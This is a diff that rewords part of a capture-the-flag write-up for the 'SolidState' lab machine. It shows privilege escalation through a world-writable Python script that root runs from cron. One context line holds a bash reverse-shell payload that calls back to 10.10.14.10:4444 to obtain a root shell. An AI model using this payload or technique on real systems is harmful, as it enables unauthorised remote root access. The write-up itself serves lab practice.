@@ -593,7 +593,7 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
 
 <br />
 
-While enumerating the system, we detect a crontab with `pspy` (important to run the 32 bits version):
+While enumerating the system, we detect a crontab with `pspy` (Note: run the 32-bits version, since the target is `i686`):
 
 <br />
 
@@ -624,7 +624,7 @@ done
 
 <br />
 
-Apparently, the superuser `root` is running a python script named `tmp.py` into the `/opt` directory.
+The output shows that the superuser `root` is executing a Python script named `tmp.py` located in the `/opt` directory.
 
 <br />
 
@@ -641,7 +641,7 @@ except:
 
 <br />
 
-If we run a `ls -l` to this directory, we have all permissions over this file, including the write one:
+Running `ls -l` on this directory confirms that the file has `world-writable` permissions, allowing us to modify it:
 
 <br />
 
@@ -683,7 +683,7 @@ os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'")
 
 <br />
 
-After waiting 3-4 minutes, we receive the shell:
+After waiting 3-4 minutes, we receive a reverse shell as `root`:
 
 <br />
 
